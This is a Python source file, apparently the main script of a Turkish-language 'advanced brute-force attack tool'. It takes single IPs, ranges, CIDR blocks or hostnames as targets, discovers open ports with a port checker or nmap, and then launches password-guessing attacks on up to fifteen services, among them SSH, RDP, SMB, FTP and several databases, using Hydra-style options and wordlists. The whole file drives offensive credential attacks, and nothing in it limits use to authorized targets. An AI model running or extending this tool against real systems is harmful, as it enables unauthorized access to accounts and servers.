#!/usr/bin/env python3
import os
import socket
import sys
import shlex
from services.scanner import NmapTarayici
from services.port_checker import PortChecker
from services.ftp import FTPBruteForce
from services.ssh import SSHBruteForce
from services.http import HTTPBruteForce
from services.https import HTTPSBruteForce
from services.mysql import MySQLBruteForce
from services.postgresql import PostgreSQLBruteForce
from services.smtp import SMTPBruteForce
from services.pop3 import POP3BruteForce
from services.imap import IMAPBruteForce
from services.rdp import RDPBruteForce
from services.smb import SMBBruteForce
from services.telnet import TelnetBruteForce
from services.vnc import VNCBruteForce
from services.mssql import MSSQLBruteForce
from services.mongodb import MongoDBBruteForce
from utils.raporlayici import Raporlayici
from config import Ayarlar

def giris_ekrani():
    print("=" * 60)
    print("GELÄ°ÅžMÄ°Åž BRUTE-FORCE SALDIRI ARACI".center(60))
    print("=" * 60)
    print(f"Versiyon: 3.0 | Parametrik GiriÅŸ | Port Check | Console Output\n")
    print("ðŸ’¡ Ä°pucu: -h yazarak yardÄ±m alabilirsiniz!")
    print("ðŸ’¡ KullanÄ±m: Sadece IP ve parametreleri yazÄ±n!")
    print("ðŸ’¡ Ã–rnekler:")
    print("   192.168.1.1 -h  (tÃ¼m servisler)")
    print("   192.168.1.1 -s ssh -t 8  (SSH, 8 thread)")
    print("   192.168.1.1 -s ftp -L users.txt -P pass.txt  (Ã¶zel wordlist)")
    print("   192.168.1.1 -s http -V -f  (HTTP, verbose, first found)")
    print("   192.168.1.1 -s ssh -l admin -p password123  (tek kullanÄ±cÄ±/ÅŸifre)")
    print("   192.168.1.1 -n  (nmap taramasÄ±)")
    print("   192.168.1.1  (port check)")
    print("=" * 60)

def gecerli_ip_girisi(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def parametrik_giris_kontrol(giris):
    """Parametrik giriÅŸleri kontrol eder ve iÅŸler"""
    giris = giris.strip()
    
    # YardÄ±m parametresi
    if giris.lower() in ['-h', '--help', 'help', 'yardÄ±m']:
        print("\n" + "="*60)
        print("PARAMETRÄ°K GÄ°RÄ°Åž YARDIMI".center(60))
        print("="*60)
        print("KullanÄ±m Ã¶rnekleri:")
        print("  IP Adresi: 192.168.1.1")
        print("  IP AralÄ±ÄŸÄ±: 192.168.1.1-10")
        print("  CIDR Notasyonu: 192.168.1.0/24")
        print("  Hostname: example.com")
        print("\nParametrik KullanÄ±m:")
        print("  -h: TÃ¼m servislere saldÄ±rÄ±")
        print("  -s [servis]: Belirli servis (Ã¶rn: -s ssh)")
        print("  -n: Nmap taramasÄ±")
        print("\nHydra Parametreleri:")
        print("  -L [dosya]: KullanÄ±cÄ± listesi dosyasÄ±")
        print("  -P [dosya]: Åžifre listesi dosyasÄ±")
        print("  -l [kullanÄ±cÄ±]: Tek kullanÄ±cÄ±")
        print("  -p [ÅŸifre]: Tek ÅŸifre")
        print("  -t [sayÄ±]: Thread sayÄ±sÄ±")
        print("  -W [saniye]: Timeout")
        print("  -s [port]: Port numarasÄ±")
        print("  -V: Verbose mod")
        print("  -d: Debug mod")
        print("  -f: Ä°lk bulunanÄ± durdur")
        print("  -R: Restore session")
        print("  -o [dosya]: Ã‡Ä±ktÄ± dosyasÄ±")
        print("  -b [dosya]: Log dosyasÄ±")
        print("  -x: XML Ã§Ä±ktÄ±")
        print("  -F [parametreler]: Form parametreleri (HTTP iÃ§in)")
        print("  -C [dosya]: Ã–zel parametre dosyasÄ±")
        print("  -M [dosya]: ModÃ¼l dosyasÄ±")
        print("  -m [servis]: Servis adÄ±")
        print("\nKullanÄ±m:")
        print("  Sadece IP ve parametreleri yazÄ±n:")
        print("  192.168.1.1 -h")
        print("  192.168.1.1 -s ssh")
        print("  192.168.1.1 -n")
        print("  YardÄ±m: -h, --help, help, yardÄ±m")
        print("  Ã‡Ä±kÄ±ÅŸ: exit, quit, Ã§Ä±kÄ±ÅŸ")
        print("="*60)
        return None
    
    # Ã‡Ä±kÄ±ÅŸ parametresi
    if giris.lower() in ['exit', 'quit', 'Ã§Ä±kÄ±ÅŸ', 'q']:
        print("[!] Program sonlandÄ±rÄ±lÄ±yor...")
        exit(0)
    
    # IP aralÄ±ÄŸÄ± kontrolÃ¼ (Ã¶rn: 192.168.1.1-10)
    if '-' in giris and giris.count('.') == 3:
        try:
            base_ip, range_part = giris.rsplit('.', 1)
            start, end = range_part.split('-')
            base_ip = f"{base_ip}.{start}"
            if gecerli_ip_girisi(base_ip):
                return giris  # IP aralÄ±ÄŸÄ± geÃ§erli
        except:
            pass
    
    # CIDR notasyonu kontrolÃ¼ (Ã¶rn: 192.168.1.0/24)
    if '/' in giris:
        try:
            ip_part, cidr = giris.split('/')
            if gecerli_ip_girisi(ip_part) and 0 <= int(cidr) <= 32:
                return giris  # CIDR geÃ§erli
        except:
            pass
    
    # Tek IP kontrolÃ¼
    if gecerli_ip_girisi(giris):
        return giris
    
    # Hostname kontrolÃ¼ (basit)
    if '.' in giris and not giris.startswith('-'):
        return giris  # Hostname olarak kabul et
    
    return None

def hedef_ip_al():
    while True:
        giris = input("Hedef IP ve parametreleri girin (Ã¶rn: 192.168.1.1 -h): ").strip()
        
        # BirleÅŸik giriÅŸ desteÄŸi: "192.168.1.1 -h" gibi
        if ' ' in giris:
            try:
                tokens = shlex.split(giris)
            except Exception:
                tokens = giris.split()
            if len(tokens) >= 2:
                hedef, parametreler = tokens[0], tokens[1:]
                # Hedef geÃ§erli mi?
                if parametrik_giris_kontrol(hedef):
                    return (hedef, parametreler)
                else:
                    print("[!] GeÃ§ersiz hedef formatÄ±. Ã–rnek: 192.168.1.1, 192.168.1.0/24, example.com")
                    continue
        
        # Parametrik kontrol
        sonuc = parametrik_giris_kontrol(giris)
        if sonuc is None:
            continue  # YardÄ±m gÃ¶sterildi, tekrar sor
        elif sonuc:
            return sonuc
        
        print("[!] GeÃ§ersiz format! Ã–rnekler:")
        print("  - IP: 192.168.1.1")
        print("  - IP + Parametre: 192.168.1.1 -h")
        print("  - IP + Servis: 192.168.1.1 -s ssh")
        print("  - AralÄ±k: 192.168.1.1-10")
        print("  - CIDR: 192.168.1.0/24")
        print("  - Hostname: example.com")
        print("  - YardÄ±m: -h")

def port_check_ve_saldiri(hedef_ip, raporlayici):
    """Port check ile aÃ§Ä±k portlarÄ± bulup saldÄ±rÄ± yapar"""
    print(f"\n[+] {hedef_ip} iÃ§in port check baÅŸlatÄ±lÄ±yor...")
    
    port_checker = PortChecker(hedef_ip)
    acik_portlar = port_checker.servis_portlarini_tara()
    acik_servisler = port_checker.acik_servisleri_getir()
    
    if not acik_servisler:
        print("[-] AÃ§Ä±k servis bulunamadÄ±!")
        return
    
    print(f"\n[+] Bulunan aÃ§Ä±k servisler:")
    for servis, port in acik_servisler.items():
        print(f"  - {servis.upper()} (Port {port})")
    
    # Servis sÄ±nÄ±flarÄ± eÅŸleme
    servis_esleme = {
        'ftp': FTPBruteForce,
        'ssh': SSHBruteForce,
        'http': HTTPBruteForce,
        'https': HTTPSBruteForce,
        'mysql': MySQLBruteForce,
        'postgresql': PostgreSQLBruteForce,
        'mongodb': MongoDBBruteForce,
        'smtp': SMTPBruteForce,
        'pop3': POP3BruteForce,
        'imap': IMAPBruteForce,
        'rdp': RDPBruteForce,
        'smb': SMBBruteForce,
        'telnet': TelnetBruteForce,
        'vnc': VNCBruteForce,
        'mssql': MSSQLBruteForce
    }
    
    print(f"\n[+] Brute force saldÄ±rÄ±larÄ± baÅŸlatÄ±lÄ±yor...")
    for servis_adi, port in acik_servisler.items():
        if servis_adi in servis_esleme:
            try:
                saldiri = servis_esleme[servis_adi](hedef_ip, port)
                saldiri.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
            except Exception as e:
                print(f"[!] {servis_adi.upper()} hatasÄ±: {str(e)}")
                continue

def nmap_tarama_ve_saldiri(hedef_ip, raporlayici):
    """Nmap ile detaylÄ± tarama ve saldÄ±rÄ±"""
    try:
        print(f"\n[+] {hedef_ip} iÃ§in Nmap taramasÄ± baÅŸlatÄ±lÄ±yor...")
        
        tarayici = NmapTarayici(hedef_ip)
        acik_servisler = tarayici.detayli_tarama()
        
        if not acik_servisler:
            print("[-] AÃ§Ä±k port bulunamadÄ±")
            return
        
        print(f"\n[+] Bulunan Servisler:")
        for servis in acik_servisler:
            host = servis.get('host', hedef_ip)
            print(f"  - {host}:{servis['port']}/{servis['protokol']}: {servis['servis']} ({servis['versiyon']})")
        
        servis_esleme = {
            'ftp': FTPBruteForce,
            'ssh': SSHBruteForce,
            'http': HTTPBruteForce,
            'https': HTTPSBruteForce,
            'mysql': MySQLBruteForce,
            'postgresql': PostgreSQLBruteForce,
            'mongodb': MongoDBBruteForce,
            'smtp': SMTPBruteForce,
            'pop3': POP3BruteForce,
            'imap': IMAPBruteForce,
            'rdp': RDPBruteForce,
            'smb': SMBBruteForce,
            'telnet': TelnetBruteForce,
            'vnc': VNCBruteForce,
            'mssql': MSSQLBruteForce
        }
        
        print(f"\n[+] Brute force saldÄ±rÄ±larÄ± baÅŸlatÄ±lÄ±yor...")
        for servis in acik_servisler:
            servis_adi = servis['servis']
            host = servis.get('host', hedef_ip)
            if servis_adi in servis_esleme:
                try:
                    saldiri = servis_esleme[servis_adi](host, servis['port'])
                    saldiri.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
                except Exception as e:
                    print(f"[!] {servis_adi.upper()} hatasÄ±: {str(e)}")
                    continue
    except Exception as e:
        print(f"[!] Nmap tarama hatasÄ±: {str(e)}")
        raporlayici.rapor_ekle("NMAP", hedef_ip, "N/A", "HATA", str(e))

def tum_servislere_saldiri(hedef_ip, raporlayici):
    """TÃ¼m desteklenen servislere saldÄ±rÄ±"""
    print(f"\n[+] {hedef_ip} iÃ§in tÃ¼m servislere saldÄ±rÄ± baÅŸlatÄ±lÄ±yor...")
    
    servis_esleme = {
        'ftp': FTPBruteForce,
        'ssh': SSHBruteForce,
        'http': HTTPBruteForce,
        'https': HTTPSBruteForce,
        'mysql': MySQLBruteForce,
        'postgresql': PostgreSQLBruteForce,
        'mongodb': MongoDBBruteForce,
        'smtp': SMTPBruteForce,
        'pop3': POP3BruteForce,
        'imap': IMAPBruteForce,
        'rdp': RDPBruteForce,
        'smb': SMBBruteForce,
        'telnet': TelnetBruteForce,
        'vnc': VNCBruteForce,
        'mssql': MSSQLBruteForce
    }
    
    for servis_adi, port in Ayarlar.PORTLAR.items():
        if servis_adi in servis_esleme:
            try:
                print(f"\n[+] {servis_adi.upper()} servisi deneniyor...")
                saldiri = servis_esleme[servis_adi](hedef_ip, port)
                saldiri.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
            except Exception as e:
                print(f"[!] {servis_adi.upper()} hatasÄ±: {str(e)}")
                continue

def belirli_servise_saldiri(hedef_ip, servis_adi, raporlayici):
    """Belirli bir servise saldÄ±rÄ±"""
    if servis_adi not in Ayarlar.PORTLAR:
        print(f"[!] {servis_adi} servisi desteklenmiyor!")
        return
    
    port = Ayarlar.PORTLAR[servis_adi]
    servis_esleme = {
        'ftp': FTPBruteForce,
        'ssh': SSHBruteForce,
        'http': HTTPBruteForce,
        'https': HTTPSBruteForce,
        'mysql': MySQLBruteForce,
        'postgresql': PostgreSQLBruteForce,
        'mongodb': MongoDBBruteForce,
        'smtp': SMTPBruteForce,
        'pop3': POP3BruteForce,
        'imap': IMAPBruteForce,
        'rdp': RDPBruteForce,
        'smb': SMBBruteForce,
        'telnet': TelnetBruteForce,
        'vnc': VNCBruteForce,
        'mssql': MSSQLBruteForce
    }
    
    if servis_adi in servis_esleme:
        try:
            saldiri = servis_esleme[servis_adi](hedef_ip, port)
            saldiri.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
        except Exception as e:
            print(f"[!] {servis_adi.upper()} hatasÄ±: {str(e)}")

def parametrik_komut_isle(hedef_ip, parametreler):
    """Parametrik komut satÄ±rÄ± giriÅŸini iÅŸler"""
    print(f"[+] Hedef: {hedef_ip}")
    print(f"[+] Parametreler: {' '.join(parametreler)}")
    
    # Parametreleri analiz et
    servisler = []
    hydra_parametreleri = {}
    
    i = 0
    while i < len(parametreler):
        param = parametreler[i]
        
        # Servis seÃ§imi (-s)
        if param == "-s" and i + 1 < len(parametreler):
            servis = parametreler[i + 1].lower()
            if servis in Ayarlar.PORTLAR:
                servisler.append(servis)
            else:
                print(f"[!] Bilinmeyen servis: {servis}")
            i += 2
            
        # TÃ¼m servisler (-h)
        elif param == "-h":
            servisler = list(Ayarlar.PORTLAR.keys())
            i += 1
            
        # Nmap taramasÄ± (-n)
        elif param == "-n":
            print(f"[+] Nmap taramasÄ± baÅŸlatÄ±lÄ±yor...")
            raporlayici = Raporlayici()
            nmap_tarama_ve_saldiri(hedef_ip, raporlayici)
            return
            
        # Hydra parametreleri
        elif param in ["-L", "-P", "-l", "-p", "-t", "-W", "-s", "-o", "-b", "-R", "-F", "-C", "-M", "-m"]:
            if i + 1 < len(parametreler):
                hydra_parametreleri[param] = parametreler[i + 1]
                print(f"[+] Hydra parametresi: {param} {parametreler[i + 1]}")
                i += 2
            else:
                print(f"[!] {param} parametresi iÃ§in deÄŸer eksik")
                i += 1
                
        # Boolean parametreler
        elif param in ["-V", "-d", "-f", "-R", "-x"]:
            hydra_parametreleri[param] = True
            print(f"[+] Hydra parametresi: {param}")
            i += 1
            
        # Ã–zel parametreler (-- ile baÅŸlayan)
        elif param.startswith("--"):
            if i + 1 < len(parametreler) and not parametreler[i + 1].startswith("-"):
                hydra_parametreleri[param] = parametreler[i + 1]
                print(f"[+] Ã–zel parametre: {param} {parametreler[i + 1]}")
                i += 2
            else:
                hydra_parametreleri[param] = True
                print(f"[+] Ã–zel parametre: {param}")
                i += 1
                
        # Bilinmeyen parametreler
        else:
            print(f"[!] Bilinmeyen parametre: {param}")
            i += 1
    
    # EÄŸer servis belirtilmemiÅŸse port check yap
    if not servisler:
        print(f"[+] Port check ile servis tespiti yapÄ±lÄ±yor...")
        port_checker = PortChecker(hedef_ip)
        acik_portlar = port_checker.servis_portlarini_tara()
        acik_servisler = port_checker.acik_servisleri_getir()
        servisler = list(acik_servisler.keys())
        
        if not servisler:
            print("[-] AÃ§Ä±k servis bulunamadÄ±!")
            return
    
    print(f"[+] SaldÄ±rÄ±lacak servisler: {', '.join(servisler).upper()}")
    
    # Servis sÄ±nÄ±flarÄ± eÅŸleme
    servis_esleme = {
        'ftp': FTPBruteForce,
        'ssh': SSHBruteForce,
        'http': HTTPBruteForce,
        'https': HTTPSBruteForce,
        'mysql': MySQLBruteForce,
        'postgresql': PostgreSQLBruteForce,
        'mongodb': MongoDBBruteForce,
        'smtp': SMTPBruteForce,
        'pop3': POP3BruteForce,
        'imap': IMAPBruteForce,
        'rdp': RDPBruteForce,
        'smb': SMBBruteForce,
        'telnet': TelnetBruteForce,
        'vnc': VNCBruteForce,
        'mssql': MSSQLBruteForce
    }
    
    # VarsayÄ±lan deÄŸerler
    kullanici_listesi = hydra_parametreleri.get('-L', Ayarlar.KULLANICI_ADI_LISTESI)
    sifre_listesi = hydra_parametreleri.get('-P', Ayarlar.PAROLA_LISTESI)
    
    # SaldÄ±rÄ±larÄ± baÅŸlat
    raporlayici = Raporlayici()
    for servis_adi in servisler:
        if servis_adi in servis_esleme:
            try:
                port = Ayarlar.PORTLAR[servis_adi]
                saldiri = servis_esleme[servis_adi](hedef_ip, port)
                
                # Hydra parametrelerini uygula
                for param, value in hydra_parametreleri.items():
                    if param == '-t':
                        saldiri.thread_sayisi = int(value)
                    elif param == '-W':
                        saldiri.timeout = int(value)
                    elif param == '-L':
                        saldiri.kullanici_listesi = value
                    elif param == '-P':
                        saldiri.sifre_listesi = value
                    elif param == '-l':
                        saldiri.tek_kullanici = value
                    elif param == '-p':
                        saldiri.tek_sifre = value
                    elif param == '-s':
                        saldiri.port = int(value)
                    elif param == '-V':
                        saldiri.verbose = True
                    elif param == '-d':
                        saldiri.debug = True
                    elif param == '-f':
                        saldiri.first_found = True
                    elif param == '-R':
                        saldiri.restore = True
                    elif param == '-o':
                        saldiri.output_file = value
                    elif param == '-b':
                        saldiri.log_file = value
                    elif param == '-x':
                        saldiri.xml_output = True
                    elif param == '-F':
                        saldiri.form_params = value
                    elif param == '-C':
                        saldiri.custom_params = value
                    elif param == '-M':
                        saldiri.module_path = value
                    elif param == '-m':
                        saldiri.service_name = value
                
                saldiri.saldir(kullanici_listesi, sifre_listesi)
            except Exception as e:
                print(f"[!] {servis_adi.upper()} hatasÄ±: {str(e)}")
                continue

def main():
    # Dizinleri oluÅŸtur
    for dir in ["wordlists", "reports", "sonuclar"]:
        os.makedirs(dir, exist_ok=True)
    
    giris_ekrani()
    
    # Komut satÄ±rÄ± parametreleri kontrolÃ¼
    if len(sys.argv) > 1:
        hedef_ip = sys.argv[1]
        
        # Tek argÃ¼man verilmiÅŸ ama iÃ§inde parametreler var ise (Ã¶rn: "192.168.1.1 -h") ayrÄ±ÅŸtÄ±r
        if len(sys.argv) == 2 and (' ' in hedef_ip):
            try:
                tokens = shlex.split(hedef_ip)
            except Exception:
                tokens = hedef_ip.split()
            if len(tokens) >= 2:
                hedef_ip, parametreler = tokens[0], tokens[1:]
                print(f"[+] Hedef: {hedef_ip}")
                print(f"[+] Parametreler: {' '.join(parametreler)}")
                parametrik_komut_isle(hedef_ip, parametreler)
                return
        
        # EÄŸer sadece IP verilmiÅŸse parametrik komut iÅŸle
        if len(sys.argv) > 2:
            parametreler = sys.argv[2:]
            parametrik_komut_isle(hedef_ip, parametreler)
        else:
            # Sadece IP verilmiÅŸse port check yap
            print(f"[+] Hedef: {hedef_ip}")
            print(f"[+] Port check ile saldÄ±rÄ± baÅŸlatÄ±lÄ±yor...")
            raporlayici = Raporlayici()
            port_check_ve_saldiri(hedef_ip, raporlayici)
            
    else:
        # EtkileÅŸimli mod
        hedef_giris = hedef_ip_al()
        
        # Interaktif modda birleÅŸik giriÅŸ verilmiÅŸse (Ã¶rn: "192.168.1.1 -h") doÄŸrudan iÅŸle ve Ã§Ä±k
        if isinstance(hedef_giris, tuple):
            hedef_ip, parametreler = hedef_giris
            print(f"\n[+] Hedef: {hedef_ip}")
            parametrik_komut_isle(hedef_ip, parametreler)
            return
        else:
            hedef_ip = hedef_giris
        
        print(f"\n[+] Hedef: {hedef_ip}")
        print("\nMod seÃ§imi:")
        print("1. Port Check ile saldÄ±rÄ± (varsayÄ±lan)")
        print("2. Nmap ile detaylÄ± tarama")
        print("3. TÃ¼m servislere saldÄ±rÄ±")
        print("4. Belirli servis seÃ§imi")
        
        secim = input("\nMod seÃ§in (1-4, varsayÄ±lan: 1): ").strip() or "1"
        
        raporlayici = Raporlayici()
        
        if secim == "2":
            nmap_tarama_ve_saldiri(hedef_ip, raporlayici)
        elif secim == "3":
            tum_servislere_saldiri(hedef_ip, raporlayici)
        elif secim == "4":
            servis_adi = input("Servis adÄ± girin (Ã¶rn: ssh): ").strip().lower()
            belirli_servise_saldiri(hedef_ip, servis_adi, raporlayici)
        else:
            port_check_ve_saldiri(hedef_ip, raporlayici)

if __name__ == "__main__":
    main()